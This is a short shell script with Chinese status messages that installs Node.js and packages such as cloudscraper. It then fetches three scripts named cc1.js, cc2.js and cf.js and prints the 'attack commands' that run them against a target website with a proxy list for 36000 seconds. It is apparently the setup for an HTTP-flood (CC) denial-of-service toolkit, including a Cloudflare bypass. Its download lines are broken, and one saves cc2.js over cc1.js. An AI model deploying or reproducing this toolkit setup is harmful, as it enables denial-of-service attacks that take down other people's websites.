    echo "安装nodejs"
    echo "进入/usr/local"
    cd /usr/local
	echo "创建文件夹"
	mkdir application
	echo "进入文件夹"
	cd /usr/local/application
	echo "下载nodejs源文件"
	wget https://cdn.npm.taobao.org/dist/node/v12.11.1/node-v12.11.1-linux-x64.tar.xz
	echo "解压"
	tar -xvf node-v12.11.1-linux-x64.tar.xz
	echo "重命为nodejs"
	mv node-v12.11.1-linux-x64 nodejs
	echo "通过建立软连接变为全局"
	ln -s /usr/local/application/nodejs/bin/npm /usr/local/bin/
    ln -s /usr/local/application/nodejs/bin/node /usr/local/bin/
	cd /root
	echo "安装必要插件"
	npm install net fs  url path child_process colors
	npm install fs net events bindings request-promise url cloudscraper request
	echo "下载脚本"
	wget ./cc1.js -O cc1.js
	wget ./cc2.js -O cc1.js
	wget ./cf.js -O cf.js
	echo "提权文件"
	chmod 777 cc1.js
	chmod 777 cf.js
    echo "下载成功"
    echo "攻击指令：node cc1.js 网址 daili.txt 36000"
    echo "攻击指令：node cc2.js 网址 daili.txt 36000"
    echo "攻击指令：node cf.js 网址 daili.txt 36000"